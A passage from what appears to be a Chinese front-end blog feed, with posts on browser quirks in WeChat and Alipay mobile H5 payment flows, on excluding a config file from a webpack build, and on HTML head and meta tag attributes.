        <content type="html"><![CDATA[<h1 id="1-支付流程"><a href="#1-支付流程" class="headerlink" title="1. 支付流程"></a>1. 支付流程</h1><p><a href="https://pay.weixin.qq.com/wiki/doc/api/H5.php?chapter=15_1">微信移动端支付官方文档</a></p><p><a href="https://docs.open.alipay.com/api_1/alipay.trade.wap.pay/">支付宝移动端支付官方文档</a></p><p><a href="https://opendocs.alipay.com/apis/api_1/alipay.trade.page.pay/">支付宝 PC 端支付官方文档</a></p><p>微信支付在移动端 H5 浏览器中可以唤醒微信应用进行支付，其业务流程为：</p><ul><li>用户在浏览器端点击支付</li><li>前端向后台请求微信支付中间页的跳转链接</li><li>在前端打开该链接，并等待跳转到支付中间页</li><li>唤醒用户手机的微信支付</li><li>支付完毕返回浏览器</li><li>中间页自动跳转到设置的重定向页面</li></ul><p>支付宝在移动端 H5 浏览器中也可以唤醒支付宝应用进行支付，其业务流程为：</p><ul><li>用户在浏览器点击支付</li><li>前端向后台请求表单信息</li><li>前端将请求到的表单作为 DOM 节点插入到 Body 中，并使用 JS 提交该表单，之后会自动跳转到支付中间页</li><li>唤醒用户支付宝支付</li><li>支付完毕返回浏览器（安卓端会自动返回浏览器，iOS端需要手动切回浏览器）</li><li>中间页自动跳转到设置的重定向页面</li></ul><p>微信支付与支付宝支付的总体流程相似，在客户端的操作效果如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200413170606.png" alt=""></p><h1 id="2-微信支付的坑"><a href="#2-微信支付的坑" class="headerlink" title="2. 微信支付的坑"></a>2. 微信支付的坑</h1><p>在标准浏览器下可以按照如下方式进行页面的跳转：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">request</span>(<span class="string">&quot;/api/pay&quot;</span>, <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> orderid = res.<span class="property">data</span>.<span class="property">orderid</span> <span class="comment">// 获取该订单编号</span></span><br><span class="line">  <span class="keyword">let</span> redirectUrl = <span class="string">&quot;www.test.com/paydone?orderid=&quot;</span> + orderid <span class="comment">// 生成重定向页面的地址</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> middlePageUrl = res.<span class="property">data</span>.<span class="property">url</span> <span class="comment">// 获取生成的支付中间页</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">`<span class="subst">$&#123;middlePageUrl&#125;</span>&amp;redirect_url=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(redirectUrl)&#125;</span>`</span>) <span class="comment">// 拼接 url（为了配置重定向页面）</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Safari-浏览器在异步方法中使用-window-open-无效"><a href="#Safari-浏览器在异步方法中使用-window-open-无效" class="headerlink" title="Safari 浏览器在异步方法中使用 window.open() 无效"></a>Safari 浏览器在异步方法中使用 window.open() 无效</h2><p>在 Safari 浏览器的异步方法中禁用了 <code>window.open()</code> 方法，因此我们不能在想服务器请求到支付中间页的 url 后再打开中间页，而是再请求前先打开一个中间页，再将中间页的 url 进行替换，才能跳转到中间页，因此需要改代码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> w = <span class="variable language_">window</span>.<span class="title function_">open</span>()</span><br><span class="line"><span class="title function_">request</span>(<span class="string">&quot;/api/pay&quot;</span>, <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> orderid = res.<span class="property">data</span>.<span class="property">orderid</span> <span class="comment">// 获取该订单编号</span></span><br><span class="line">  <span class="keyword">let</span> redirectUrl = <span class="string">&quot;http://www.test.com/paydone?orderid=&quot;</span> + orderid <span class="comment">// 生成重定向页面的地址</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> middlePageUrl = res.<span class="property">data</span>.<span class="property">url</span> <span class="comment">// 获取生成的支付中间页</span></span><br><span class="line">  w.<span class="property">location</span> = <span class="string">`<span class="subst">$&#123;middlePageUrl&#125;</span>&amp;redirect_url=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(redirectUrl)&#125;</span>`</span> <span class="comment">// 调整新打开页面的 url</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="华为浏览器问题"><a href="#华为浏览器问题" class="headerlink" title="华为浏览器问题"></a>华为浏览器问题</h2><p>当客户端发起支付请求后，开启微信支付中间页唤醒微信支付。在标准浏览器下，支付完成之后页面会自动跳转到 redirect_url，但是华为浏览器的行为是将支付中间页的 url 替换为跳转前的页面（也就是上图的A页面）并刷新页面，导致 redirect_url 失效，最终导致华为浏览器的支付效果为：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200413171328.png" alt=""></p><p>所以对于垃圾华为来说，微信支付的自动跳转会失效，因此不能使用重定向的功能。那么就需要在支付前的页面（A页面）开启一个监听，监听是否支付完成，如果支付完成就自动关闭支付页，重新返回 A 页面并提示用户支付已经完成。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> w = <span class="variable language_">window</span>.<span class="title function_">open</span>()</span><br><span class="line"><span class="keyword">let</span> status = <span class="string">&quot;pedding&quot;</span></span><br><span class="line"><span class="title function_">watch</span>(<span class="string">&quot;pay_done&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  w.<span class="title function_">close</span>()</span><br><span class="line">  status = <span class="string">&quot;done&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="title function_">request</span>(<span class="string">&quot;/api/pay&quot;</span>, <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> middlePageUrl = res.<span class="property">data</span>.<span class="property">url</span> <span class="comment">// 获取生成的支付中间页</span></span><br><span class="line">  w.<span class="property">location</span> = middlePageUrl</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是 Safari 浏览器会禁止在 A 页面关闭 B 页面这种操作（存疑），所以我们推荐在 IOS 端使用页面重定向方案，在安卓端使用 A 页面监听支付状态，关闭 B 页面这种操作。</p><h1 id="3-支付宝支付的坑"><a href="#3-支付宝支付的坑" class="headerlink" title="3. 支付宝支付的坑"></a>3. 支付宝支付的坑</h1><p>在标准浏览器下完成支付宝支付：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户点击支付按钮</span></span><br><span class="line">payBtn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">request</span>(<span class="string">&quot;/api/pay&quot;</span>, <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> formHTML = res.<span class="property">data</span>.<span class="property">formHTML</span></span><br><span class="line">    <span class="comment">// 创建 DOM 对象</span></span><br><span class="line">    <span class="keyword">let</span> tmpNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>)</span><br><span class="line">    tmpNode.<span class="property">innerHTML</span> = formHtml</span><br><span class="line">    <span class="comment">// 在临时 DOM 对象中获取 form，并获取 form 的 id</span></span><br><span class="line">    <span class="keyword">let</span> form = tmpNode.<span class="title function_">querySelector</span>(<span class="string">&quot;form&quot;</span>)</span><br><span class="line">    formId = form.<span class="title function_">getAttribute</span>(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="comment">// 插入 form </span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(form)</span><br><span class="line">    <span class="comment">// 提交 form</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(formId).<span class="title function_">submit</span>()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外这里还有个坑，默认返回的 html 是一个 form 标签以及一个 script 标签，script 标签内写的是执行提交表单的脚本。但是如果将其直接插入 body 是不会执行的，需要手动创建一个 script 对象，并将该对象的 innerHTML 替换为从服务器端获取的 html 模板中的 script 标签中的内容，再插入到 body 中才会执行（但是再上述 DEMO 中我们没有用到该 script 标签而是自行手动执行）。</p><h2 id="IOS-端无法在异步方法中提交表单"><a href="#IOS-端无法在异步方法中提交表单" class="headerlink" title="IOS 端无法在异步方法中提交表单"></a>IOS 端无法在异步方法中提交表单</h2><p>如果按照上面的代码使用支付宝付款，那么会无法触发 <code>submit()</code> 方法，为了解决该问题，需要修改操作逻辑，也就是先请求支付宝表单，将表单插入页面 body 中，然后我们再引导用户点击一个按钮，触发表单的提交事件，因此需要改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 再支付按钮生成时就从服务器拉取支付宝表单并插入 DOM 中</span></span><br><span class="line"><span class="title function_">request</span>(<span class="string">&quot;/api/pay&quot;</span>, <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> formHTML = res.<span class="property">data</span>.<span class="property">formHTML</span></span><br><span class="line">  <span class="comment">// 创建 DOM 对象</span></span><br><span class="line">  <span class="keyword">let</span> tmpNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>)</span><br><span class="line">  tmpNode.<span class="property">innerHTML</span> = formHtml</span><br><span class="line">  <span class="comment">// 在临时 DOM 对象中获取 form，并获取 form 的 id</span></span><br><span class="line">  <span class="keyword">let</span> form = tmpNode.<span class="title function_">querySelector</span>(<span class="string">&quot;form&quot;</span>)</span><br><span class="line">  form.<span class="title function_">setAttribute</span>(<span class="string">&quot;target&quot;</span>, <span class="string">&quot;_blank&quot;</span>) <span class="comment">// 设置表单在新窗口打开</span></span><br><span class="line">  formId = form.<span class="title function_">getAttribute</span>(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">  <span class="comment">// 插入 form </span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(form)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户点击支付按钮</span></span><br><span class="line">payBtn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(formId).<span class="title function_">submit</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 支付宝 </tag>
            
            <tag> 微信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack下避免打包某文件</title>
      <link href="/2020/03/345ebf94bf2f.html"/>
      <url>/2020/03/345ebf94bf2f.html</url>
      
        <content type="html"><![CDATA[<p>在使用 Webpack 进行前端项目的编写时，对于某些全局变量，如后台 API 的 BaseUrl 通常是需要可配置的。这些配置在 webpack 中如果更改之后往往需要重新打包编译，所以我们需要将配置文件抽离出来，不让 webpack 对其进行打包编译，这样就可以修改编译后的项目配置了。</p><p>首先我们要在项目 src 根目录创建一个 config.js 文件，作为配置文件写入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.js</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">sysConfig</span> = &#123;</span><br><span class="line">  <span class="attr">apiBaseUrl</span>: <span class="string">&quot;http://47.104.211.178:9189&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再 webpack 配置中引入 <code>copy-webpack-plugin</code> 插件，对其进行配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">CopyWebpackPlugin</span>([</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">from</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;src/config.js&quot;</span>),</span><br><span class="line">      <span class="comment">// to: &quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ])</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>这样就能免除 <code>config.js</code> 被打包，同时我们再项目 html 模板中引入该文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./config.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，使用全局配置文件时就可以使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">sysConfig</span>.<span class="property">apiBaseUrl</span>); <span class="comment">// &quot;http://47.104.211.178:9189&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搞定一知半解的 &lt;Head&gt;</title>
      <link href="/2020/03/02666cef881e.html"/>
      <url>/2020/03/02666cef881e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Head-的作用"><a href="#1-Head-的作用" class="headerlink" title="1. Head 的作用"></a>1. Head 的作用</h1><p>HTML 头部是包含在 <code>&lt;head&gt;</code> 元素里面的内容。不像 <code>&lt;body&gt;</code> 元素的内容会显示在浏览器中，head 里面的内容<strong>不会在浏览器中显示</strong>，它的作用是包含一些页面的元数据。</p><blockquote><p>名词解释：元数据(Metadata)是用来概括描述数据的一些基本数据，比如一个人身高为 180cm 体重为 78kg，那么其身高与体重就是这个人的元数据。 </p></blockquote><h1 id="2-title"><a href="#2-title" class="headerlink" title="2. title"></a>2. title</h1><p>HTML <code>&lt;title&gt;</code> 元素 定义文档的标题，显示在浏览器的标题栏或标签页上。它只应该包含文本，若是包含有标签，则它包含的任何标签都将被忽略。</p><blockquote><p>这个元素值拥有<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes">全局属性。</a></p></blockquote><p>一个好的 title 的作用通常需要考虑如下几点</p><ul><li>title 是一个 SEO 的重要鉴别对象，不要使用过于普遍的词汇作为完整的 title</li><li>动态改变 title 来形容当前页面的内容，可以更好的解决无障碍问题</li></ul><h1 id="3-meta"><a href="#3-meta" class="headerlink" title="3. meta"></a>3. meta</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta">MDN 文档</a></p><p><code>&lt;meta&gt;</code> 元素表示那些不能由其它HTML元相关元素 (<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/base" title="HTML &lt;base&gt; 元素 指定用于一个文档中包含的所有相对 URL 的根 URL。一份中只能有一个 &lt;base&gt; 元素。"><code>&lt;base&gt;</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link" title="HTML外部资源链接元素 (&lt;link&gt;) 规定了当前文档与外部资源的关系。该元素最常用于链接样式表，此外也可以被用来创建站点图标(比如PC端的“favicon”图标和移动设备上用以显示在主屏幕的图标) 。"><code>&lt;link&gt;</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script" title="HTML &lt;script&gt; 元素用于嵌入或引用可执行脚本。"><code>&lt;script&gt;</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/style" title="HTML的&lt;style&gt;元素包含文档的样式信息或者文档的部分内容。默认情况下，该标签的样式信息通常是CSS的格式。"><code>&lt;style&gt;</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/title" title="HTML &lt;title&gt; 元素 定义文档的标题，显示在浏览器的标题栏或标签页上。它只应该包含文本，若是包含有标签，则它包含的任何标签都将被忽略。"><code>&lt;title&gt;</code></a>) 之一表示的任何元数据信息。</p><h2 id="3-1-charset"><a href="#3-1-charset" class="headerlink" title="3.1 charset"></a>3.1 charset</h2><p>此特性声明当前文档所使用的字符编码，但该声明可以被任何一个元素的 lang 特性的值覆盖。最常见的就是再每个页面开头声明格式为 <code>utf-8</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，不应该使用不兼容ASCII的编码规范， 以避免不必要的安全风险：浏览器不支持他们(这些不规范的编码)可能会导致浏览器渲染html出错. 比如JIS_C6226-1983, JIS_X0212-1990, HZ-GB-2312, JOHAB,ISO-2022 系列,EBCDIC系列 等文字。</p><h2 id="3-2-http-equiv"><a href="#3-2-http-equiv" class="headerlink" title="3.2 http-equiv"></a>3.2 http-equiv</h2><p>这个枚举属性定义了能改变服务器和用户引擎行为的编译，其可以设置如下的几个属性值（但是具体的编译值使用 <code>content</code> 属性来定义）：</p><h3 id="3-2-1-content-language（废弃）"><a href="#3-2-1-content-language（废弃）" class="headerlink" title="3.2.1 content-language（废弃）"></a>3.2.1 content-language（废弃）</h3><p>这个指令定义页面使用的默认语言。</p><blockquote><p>不要使用这个指令，因为它已经过时了。使用 <code>&lt;html&gt;</code> 元素上全局的 lang 属性来替代它！</p></blockquote><p><code>&quot;content-security-policy&quot;内容安全策略</code>：</p><p>它允许页面作者定义当前页的内容策略，相当于设置了一个白名单机制。内容策略主要指定允许的服务器源和脚本端点，这有助于防止跨站点脚本攻击。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><ul><li>脚本：只信任当前域名</li><li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li><li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li><li>框架（frame）：必须使用HTTPS协议加载</li><li>其他资源：没有限制</li></ul><p>更多：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">Content Security Policy 入门教程</a></p><h3 id="3-2-2-content-type（废弃）"><a href="#3-2-2-content-type（废弃）" class="headerlink" title="3.2.2 content-type（废弃）"></a>3.2.2 content-type（废弃）</h3><p>这个属性定义了文档的 MIME type , 实际上由它的字符编码决定。它遵循与HTTP content-type 头部字段相同的语法， 但由于它位于HTML页面内，因此除了text / html之外的大多数值都不能使用。 因此，其content的有效语法是字符串’text / html’，后跟一个具有以下语法的字符集：’;charset=IANAcharset，其中IANAcharset是IANA定义的字符集的首选MIME名称。</p><p>由于 <code>&lt;meta&gt;</code> 不能在 XHTML 或 HTML5 的 XHTML 序列化中更改文档的类型，因此切勿使用<code>&lt;meta&gt;</code> 将MIME类型设置为 XHTML MIME 类型。</p><blockquote><p>不要使用该指令因为它已过时。使用 <code>&lt;meta&gt;</code> 元素的charset 属性代替。</p></blockquote><h3 id="3-2-3-refresh"><a href="#3-2-3-refresh" class="headerlink" title="3.2.3 refresh"></a>3.2.3 refresh</h3><p>这个属性指定:</p><ul><li>如果<code>content</code> 只包含一个正整数,则是重新载入页面的时间间隔(秒);</li><li>如果<code>content</code> 包含一个正整数并且跟着一个字符串,则是重定向到指定链接的时间间隔(秒)</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 5秒之后刷新本页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 5秒之后转到某一页面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>  <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5;url=https://esunr.xyz&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>更多：<a href="https://www.zhangxinxu.com/wordpress/2015/03/meta-http-equiv-refresh-content/">小tip: 使用meta实现页面的定时刷新或跳转</a></p><h3 id="3-2-4-set-cookie（废弃）"><a href="#3-2-4-set-cookie（废弃）" class="headerlink" title="3.2.4 set-cookie（废弃）"></a>3.2.4 set-cookie（废弃）</h3><p>为页面定义cookie。其内容必须遵循 IETF HTTP Cookie 规范中定义的语法。</p><blockquote><p>请勿使用此说明，因为它已过时。请改用 HTTP 的 Set-Cookie 头部。</p></blockquote><h2 id="3-3-name"><a href="#3-3-name" class="headerlink" title="3.3 name"></a>3.3 name</h2><p>name 属性是一个比较杂糅的属性，其可以控制 SEO 的检索信息以及浏览器某些行为的相关设置。严格点来讲：<strong>该属性定义文档级元数据的名称</strong>。</p><p>同时，如果一个 meta 标签中包含了 itemprop、http-equiv、charset 任意一个属性的话就不能再定义 name，如下面的这个 meta 就是不合法的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>name 属性可以定义元数据的类型，content 属性可以定义这些元数据类型的具体值，由于 name 可配置的属性过多，因此就分开来讲：</p><h3 id="3-3-1-SEO-相关"><a href="#3-3-1-SEO-相关" class="headerlink" title="3.3.1 SEO 相关"></a>3.3.1 SEO 相关</h3><ul><li><p><code>application-name</code>，定义正运行在该网页上的网络应用名称;</p><p>说明：</p><ul><li>浏览器可能会通过使用该属性去区分应用。它与 <code>&lt;title&gt;</code> 元素不同，后者通常由应用程序名称组成，但也可能包含特定信息，如文档名称或状态;</li><li>简单的网页不应该去定义application-name meta标签。</li></ul></li><li><p><code>author</code>，就是这个文档的作者名称，可以用自由的格式去定义；</p><p>举例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>&quot;<span class="attr">root</span>,<span class="attr">root</span>@<span class="attr">21cn.com</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>description</code>，其中包含页面内容的简短和精确的描述。 一些浏览器，如Firefox和Opera，将其用作书签页面的默认描述。</p><p>举例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span> =<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;science, education,culture,politics,ecnomics，relationships, entertaiment, human&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>generator</code>，包含生成页面的软件的标识符。</p></li><li><p><code>keywords</code>，包含与逗号分隔的页面内容相关的单词。</p></li><li><p><code>robots</code>，robots用来告诉爬虫哪些页面需要索引，哪些页面不需要索引。content的参数有all,none,index,noindex,follow,nofollow。默认是all。</p><p>举例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;none&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>revisit-after</code>，如果页面不是经常更新，为了减轻搜索引擎爬虫对服务器带来的压力，可以设置一个爬虫的重访时间。如果重访时间过短，爬虫将按它们定义的默认时间来访问。</p><p>举例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;revisit-after&quot;</span> <span class="attr">content</span>=<span class="string">&quot;7 days&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-3-2-浏览器行为相关"><a href="#3-3-2-浏览器行为相关" class="headerlink" title="3.3.2 浏览器行为相关"></a>3.3.2 浏览器行为相关</h3><ul><li><p><code>viewport</code>，设置浏览器视口</p><p>详情查看：<a href="https://blog.esunr.site/2019/11/%E4%BB%8E%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D%E8%B0%88%E8%B0%88%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80%E4%B8%8Eview-port/">从移动端适配探讨响应式布局与 view-port</a></p></li><li><p>uc强制竖屏</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;screen-orientation&quot;</span> <span class="attr">content</span>=<span class="string">&quot;portrait&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>QQ强制竖屏</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;x5-orientation&quot;</span> <span class="attr">content</span>=<span class="string">&quot;portrait&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>UC应用模式 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;browsermode&quot;</span> <span class="attr">content</span>=<span class="string">&quot;application&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>QQ应用模式 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;x5-page-mode&quot;</span> <span class="attr">content</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>IOS启用 WebApp 全屏模式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="attr">content</span>=<span class="string">&quot;yes&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>IOS全屏模式下隐藏状态栏/设置状态栏颜色 content的值为default | black | black-translucent</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> <span class="attr">content</span>=<span class="string">&quot;black-translucent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>IOS添加到主屏后的标题 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;apple-mobile-web-app-title&quot;</span> <span class="attr">content</span>=<span 